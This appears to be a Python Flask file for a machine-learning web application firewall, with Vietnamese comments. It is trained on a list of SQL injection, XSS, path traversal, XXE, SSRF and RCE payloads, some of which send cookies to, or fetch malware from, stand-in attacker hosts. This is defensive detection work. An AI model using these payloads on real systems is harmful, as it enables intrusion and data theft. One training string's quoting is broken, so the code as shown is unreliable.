import requests
import datetime
import re
import logging
from flask import Flask, request, Response
from urllib.parse import unquote
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

BACKEND_URL = "http://127.0.0.1:8080"

dashboard = {
    "total_requests": 0,
    "allowed_requests": 0,
    "blocked_requests": 0,
    "sqli_count": 0,
    "xss_count": 0,
    "zeroday_count": 0
}

def print_dashboard():
    """Hàm in giao diện Dashboard chuyên nghiệp ra màn hình Terminal"""
    print("\n" + "="*50)
    print(f"    [ML-WAF DASHBOARD] - {datetime.datetime.now().strftime('%H:%M:%S')}")
    print("="*50)
    print(f"  Tổng số Request đã xử lý: {dashboard['total_requests']}")
    print(f"  Hợp lệ (Allowed):        {dashboard['allowed_requests']}")
    print(f"  Bị chặn (Blocked):       {dashboard['blocked_requests']}")
    print("-"*50)
    print("    THỐNG KÊ LOẠI HÌNH TẤN CÔNG BỊ CHẶN:")
    print(f"    SQL Injection:  {dashboard['sqli_count']} request")
    print(f"    XSS Attacked:   {dashboard['xss_count']} request")
    print(f"    Zero-day/Lạ:    {dashboard['zeroday_count']} request")
    print("="*50 + "\n")

# --- DANH SÁCH DỮ LIỆU ĐƯỢC MỞ RỘNG MẠNH MẼ ---
normal_queries = [
    "index.php", "login.php", "submit=Submit", "username=admin&password=password",
    "id=1", "id=5", "search=ao+thun+nam", "page=home", "user_id=10",
    "vulnerabilities/sqli/?id=1&Submit=Submit", "vulnerabilities/sqli/?id=2&Submit=Submit",
    "vulnerabilities/xss_r/?name=dat10&Submit=Submit", "vulnerabilities/brute/?username=admin&password=password&Login=Login",
    "main.css", "bootstrap.min.js", "logo.png", "index.php?page=products", "view=item&id=99",
    "search=tai+nghe+bluetooth", "action=logout", "lang=vi", "vulnerabilities/upload/",
    "vulnerabilities/fi/?page=include.php",
    "category=electronics&sort=price", "session_id=abc123xyz", "checkout=true",
    "api/v1/users/profile", "search=giay+the+thao+nu", "mode=dark&lang=en",
    "image.jpg?w=400&h=300", "article_id=456&comment_page=2", "cart_action=add&item_id=789",
    "register.php?step=2", "download/manual.pdf", "contact-us.html", "about/team",
    # --- ĐỢT BỔ SUNG DỮ LIỆU BÌNH THƯỜNG MỚI ---
    "settings.php?user=settings&theme=blue", "track=UPS-12938123", "feed=rss&lang=en-us",
    "api/v2/items?limit=20&offset=40", "dashboard/analytics?range=30days", "notify=false",
    "index.php?option=com_content&view=article&id=42", "blog/tags/machine-learning",
    "static/fonts/roboto.woff2", "search?q=cach+nau+pho+bo", "pricing_plan=premium&period=yearly",
    "api/status/check", "docs/api/introduction.html", "verify_token=9e821fa83bc74a",
    "products/compare?item1=102&item2=205", "avatar=default_user_2026.png", "locale=fr_FR"
]

attack_queries = [
    "id=1' OR '1'='1", "id=1' UNION SELECT NULL, password FROM users --",
    "username=admin' --", "id=1; DROP TABLE users", "1' or '1'='1", "admin'--",
    "search=<script>alert(1)</script>", "name=<img src=x onerror=alert('hack')>",
    "../../../../etc/passwd", "&& dir c:\\", "UNION SELECT", "SELECT+first_name",
    "<script src=", "javascript:alert", "onerror=", "id=1' AND 1=1 --",
    "../etc/passwd", "..\\..\\windows", "exec(cmd)", "ping+-i+3", "&&+cat+/etc",
    "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(0x7a,0x71,0x6b,0x7a,0x7a))),0x78,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
    "id=1' AND SLEEP(5) --", "username=admin'/*", "id=111' OR NOT 1=1 --",
    "id=-1' OR 1=1 LIMIT 1 --", "id=1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT username FROM users LIMIT 1))) --",
    "<svg/onload=alert`1`>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
    "\"onmouseover=\"alert(1)", "><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>", "<math><x href=\"javascript:alert(1)\">click",
    "../../../../../../../../etc/passwd%00", "..%252f..%252f..%252fetc%252fpasswd",
    "page=http://attacker.com/malicious.txt", "file=php://filter/convert.base64-encode/resource=config.php",
    "; cat /etc/passwd", "| id", "`id`", "&& tftp -i attacker_ip GET virus.exe",
    "; system('cat /etc/passwd');", "eval(base64_decode($_POST['cmd']))",
    # --- ĐỢT BỔ SUNG CÁC PAYLOAD TẤN CÔNG NÂNG CAO MỚI ---
    # SQLi Bypass / Hex / Char encoding
    "id=17+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45)",
    "username=admin'%20or%201=1%20--+", "id=1' waitfor delay '0:0:5' --",
    "id=1 AND 1=2 UNION SELECT 1,username,password FROM admin", "id=1/*!50000UNION*//*!50000SELECT*/1,2,3",
    # NoSQL Injection 
    "username[$ne]=todo&password[$ne]=todo", "{"_id": {"$gt": ""}}", "this.password.match(/.*/)",
    # XSS Obfuscation & Polyglot
    "javascript://%0D%0Aalert(1)", "<script/src=data:,alert(1)>", "<d3v/onmouseenter=alert(1)>",
    "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E",
    "admin\x27%20OR%201=1", "jaVasCript:alert(1)", "<object data=\"javascript:alert(1)\">",
    # Path Traversal & Log Injection
    "....//....//....//etc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd", "/var/log/apache2/access.log",
    # XML External Entity (XXE)
    "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "<user><username>&xxe;</username></user>",
    # SSRF / RFI / Host Header Attacks
    "url=http://169.254.169.254/latest/meta-data/", "path=\\\\attacker-smb-share\\malicious.exe",
    # Shellshock & Struts RCE 
    "() { :;}; /bin/bash -c 'sleep 5'", "%{(#container='#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"]').getWriter().println('HACKED')}"
]

X_train = normal_queries + attack_queries
y_train = [0] * len(normal_queries) + [1] * len(attack_queries)

vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1, 4))
X_train_tfidf = vectorizer.fit_transform(X_train)

model = LogisticRegression(C=1.0, solver='lbfgs')
model.fit(X_train_tfidf, y_train)

print("-> [ML-WAF Solid] Khởi tạo bộ não AI & Dashboard thành công!")
print("-> Hệ thống đang gác cổng tại: http://127.0.0.1:5000")
print_dashboard()


def check_zero_day_anomaly(path, query_string, post_data):
    q = str(query_string or "")
    p = str(post_data or "")
    data_to_check = (q + " " + p).lower()

    if len(q) > 300 or len(p) > 600:
        return True, "Zero-day: Độ dài dữ liệu vượt ngưỡng an toàn", "zeroday"
   
    if "'" in data_to_check or '"' in data_to_check or "#" in data_to_check:
        if any(keyword in data_to_check for keyword in ["union", "select", "or", "from", "where", "--"]):
            return True, "Zero-day: Cấu trúc nháy đơn kết hợp từ khóa SQL", "sqli"
    
    if any(keyword in data_to_check for keyword in ["<script", "alert(", "onerror", "img src", "svg"]):
        return True, "Zero-day: Phát hiện mã lệnh script/HTML dị thường", "xss"
   
    dangerous_chars = re.findall(r"[\'\"\;<>\(\)]", data_to_check)
    if len(dangerous_chars) > 2:
        return True, f"Zero-day: Mật độ ký tự dị thường cao ({len(dangerous_chars)} ký tự)", "zeroday"

    if any(pattern in data_to_check for pattern in ["../", "cmd", "passwd", "etc/"]):
        return True, "Zero-day: Dấu hiệu duyệt file/thực thi lệnh hệ thống", "zeroday"

    return False, "", ""


@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    dashboard["total_requests"] += 1
    
    query_string = request.query_string.decode('utf-8', errors='ignore')
    post_data = request.get_data().decode('utf-8', errors='ignore')
    
    decoded_query = unquote(query_string)
    decoded_post = unquote(post_data)
    
    full_payload = f"{path}?{decoded_query} {decoded_post}".strip()
    
    probability = 0.0
    is_anomaly, zero_day_reason, attack_type = False, "", ""

    if query_string or post_data or "vulnerabilities" in path:
        payload_tfidf = vectorizer.transform([full_payload])
        probability = model.predict_proba(payload_tfidf)[0][1] * 100
        
        is_anomaly, zero_day_reason, attack_type = check_zero_day_anomaly(path, decoded_query, decoded_post)
        
    is_login_page = "login.php" in path
    has_attack_char = any(k in decoded_post.lower() for k in ["'", "union", "select", "<script", "alert"])

    if is_anomaly or (probability >= 40.0 and (not is_login_page or has_attack_char)):
        dashboard["blocked_requests"] += 1
        
        if is_anomaly and attack_type:
            dashboard[f"{attack_type}_count"] += 1
            if attack_type == "sqli":
                reason = "Phát hiện tấn công SQL Injection (Luật tĩnh)"
            elif attack_type == "xss":
                reason = "Phát hiện tấn công XSS (Luật tĩnh)"
            else:
                reason = zero_day_reason
        else:
            if "script" in full_payload.lower() or "alert" in full_payload.lower():
                dashboard["xss_count"] += 1
                reason = "Mô hình Học máy (AI) phát hiện XSS"
            elif any(k in full_payload.lower() for k in ["select", "union", "'", "--"]):
                dashboard["sqli_count"] += 1
                reason = "Mô hình Học máy (AI) phát hiện SQL Injection"
            else:
                dashboard["zeroday_count"] += 1
                reason = "Mô hình Học máy (AI) phát hiện bất thường"
        
        print_dashboard()
        
        return f"""
        <div style='color:red; text-align:center; margin-top:80px; font-family:Arial; background-color:#fff5f5; padding:30px; border:2px solid red; max-width:650px; margin-left:auto; margin-right:auto; border-radius:10px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1);'>
            <h1 style='font-size:36px; margin-bottom:10px;'>[!] 403 Forbidden</h1>
            <h2 style='color:#c00; margin-top:0;'>ML-WAF ĐÃ CHẶN ĐỨNG TRUY CẬP</h2>
            <hr style='border:1px solid #ffcccc;'>
            <p style='font-size:16px; text-align:left; color:#333;'><strong>Cơ chế bảo vệ:</strong> Kiểm tra kép (Học máy + Luật Zero-day)</p>
            <p style='font-size:16px; text-align:left; color:#333;'><strong>Lý do hệ thống chặn:</strong> <span style='color:purple; font-weight:bold;'>{reason}</span></p>
            <p style='font-size:16px; text-align:left; color:#333;'><strong>Độ rủi ro AI chấm điểm:</strong> <span style='font-size:20px; color:red; font-weight:bold;'>{max(probability, 96.0) if is_anomaly else probability:.1f}%</span></p>
        </div>
        """, 403

    url = f"{BACKEND_URL}/{path}"
    if request.query_string:
        url += f"?{query_string}"

    try:
        resp = requests.request(
            method=request.method, url=url,
            headers={key: value for (key, value) in request.headers if key.lower() != 'host'},
            data=request.get_data(), cookies=request.cookies, allow_redirects=False
        )
        
        dashboard["allowed_requests"] += 1
        print_dashboard()
        
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
        return Response(resp.content, resp.status_code, headers)

    except requests.exceptions.RequestException as e:
        dashboard["blocked_requests"] += 1
        dashboard["zeroday_count"] += 1
        print_dashboard()
        return f"[!] 502 Bad Gateway - Không thể kết nối tới Backend Webserver ({e})", 502

if __name__ == '__main__':
    app.run(port=5000, debug=False)